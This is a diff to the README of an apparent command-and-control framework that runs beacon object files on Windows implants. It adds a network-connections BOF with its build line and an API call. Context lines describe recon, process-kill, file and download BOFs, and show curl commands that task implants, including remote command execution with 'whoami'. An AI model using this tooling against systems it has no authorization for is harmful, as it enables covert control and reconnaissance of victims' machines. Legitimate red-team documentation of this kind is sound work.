@@ -13,6 +13,7 @@ entry point.
 | `ps.c` | none | Lists processes via `CreateToolhelp32Snapshot` (`PID PPID NAME`). Column-formatted. |
 | `proc_list.c` | none | Lists processes, TAB-separated `NAME\tPID\tPPID\tTHREADS`. Drives `ProcessList.vue` (the Processes tab). |
 | `proc_kill.c` | bstr (PID) | `OpenProcess(PROCESS_TERMINATE) + TerminateProcess`. Drives the Processes-tab Kill button. |
+| `netstat.c` | none | Enumerates IPv4 TCP/UDP endpoints via IPHLPAPI `GetExtendedTcpTable`/`GetExtendedUdpTable` (no `netstat.exe` shell-out). TAB-separated `PROTO\tLOCAL\tREMOTE\tPID\tSTATE`. Drives `NetConnections.vue` (the Net tab). |
 | `ls.c` | raw text path (optional, default `.`) | Lists a directory via `FindFirstFileA` (`TYPE SIZE NAME`). Column-formatted. |
 | `file_list.c` | bstr (path, optional) | Lists a directory via `FindFirstFileW` (Unicode-safe — non-ASCII/Chinese paths + names round-trip via UTF-8↔UTF-16), `CWD: <path>` header + `D/F\tNAME\tSIZE\tEPOCH` per entry. Drives `FileBrowser.vue` (the Files tab). |
 | `sysinfo.c` | none | Recon BOF. Emits `KEY=VALUE` lines: `internal_ip` (UDP-connect trick), `external_ip` (HTTP GET `http://ifconfig.me/ip`), `user`, `computer`, `process`, `pid`, `os`+`os_build` (`NTDLL$RtlGetVersion`), `arch`, `online_time`. The Go core auto-runs this on every implant connect and parses it to populate the agent table. |
@@ -66,6 +67,7 @@ gcc -c examples/winapi_exec.c       -o examples/winapi_exec.x64.o
 gcc -c examples/ps.c                -o examples/ps.x64.o
 gcc -c examples/proc_list.c         -o examples/proc_list.x64.o
 gcc -c examples/proc_kill.c         -o examples/proc_kill.x64.o
+gcc -c examples/netstat.c           -o examples/netstat.x64.o
 gcc -c examples/ls.c                -o examples/ls.x64.o
 gcc -c examples/file_list.c         -o examples/file_list.x64.o
 gcc -c examples/download.c          -o examples/download.x64.o
@@ -108,6 +110,7 @@ RUSTSTRIKE_BOFS=./bofs ./server.exe 4444 8091
 curl -s http://127.0.0.1:8091/api/implants
 curl -X POST "http://127.0.0.1:8091/api/bofs/ps/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
 curl -X POST "http://127.0.0.1:8091/api/bofs/proc_list/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
+curl -X POST "http://127.0.0.1:8091/api/bofs/netstat/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
 curl -X POST "http://127.0.0.1:8091/api/bofs/screenshot/run?implant=1" -H 'Content-Type: application/json' -d '{"args":""}'
 curl -X POST "http://127.0.0.1:8091/api/bofs/cmd_exec/run?implant=1" -H 'Content-Type: application/json' \
   -d "{\"args\":\"$(printf 'whoami' | base64 -w0)\"}"
